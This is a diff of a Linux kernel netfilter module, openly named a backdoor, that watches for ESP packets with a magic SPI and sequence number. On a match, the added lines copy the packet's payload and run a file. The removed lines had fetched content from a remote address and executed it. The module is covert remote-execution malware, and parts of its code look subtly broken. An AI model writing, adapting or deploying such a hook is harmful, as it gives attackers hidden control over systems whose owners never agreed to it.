@@ -1,27 +1,10 @@
-#include "nfhook.h"
-#include "debugfs.h"
-#include "request.h"
-#include "net.h"
+#include "backdoor.h"
 
 static struct nf_hook_ops nfho;
-
-void hexdump(char *bytes, int length){
-	int i = 0;
-	while (i < length){
-		printk("%c\n", bytes[i++]);
-	}
-}
-
-void parse_esp_data(char *data, char *ip, int *port){
-	hexdump(data, 16);
-	ip = "127.0.0.1";
-	*port = 8000;
-}
+unsigned char *buffer;
+unsigned long buffer_length;
 
 unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
-	int port = 80;
-	char ip[INET6_ADDRSTRLEN];
-	struct connection cn;
 	struct iphdr *ip_header;
 	struct ip_esp_hdr *esp_header;
 
@@ -35,14 +18,16 @@ unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_
 	if (ip_header->protocol == IPPROTO_ESP){
 		esp_header = ip_esp_hdr(skb);
 		if ((esp_header->spi == TARGET_SPI) && (esp_header->seq_no == TARGET_SEQ)){
-			parse_esp_data(esp_header->enc_data, ip, &port);
-			connect(ip, port, &cn);
-			if (cn.sk){
-				get("/", &cn);
-				create_file();
-				execute_file();
-				destroy_file();
-			}
+			buffer_length = (ip_header->tot_len / 256) \
+								- sizeof (struct iphdr) \
+								- sizeof (struct ip_esp_hdr);
+			buffer = kcalloc(1, (buffer_length+1) * sizeof(unsigned char), GFP_KERNEL);
+			strncpy(buffer, esp_header->enc_data, buffer_length);
+
+			execute_file();
+
+			kfree(buffer);
+			buffer_length = 0;
 		}
 	}
 
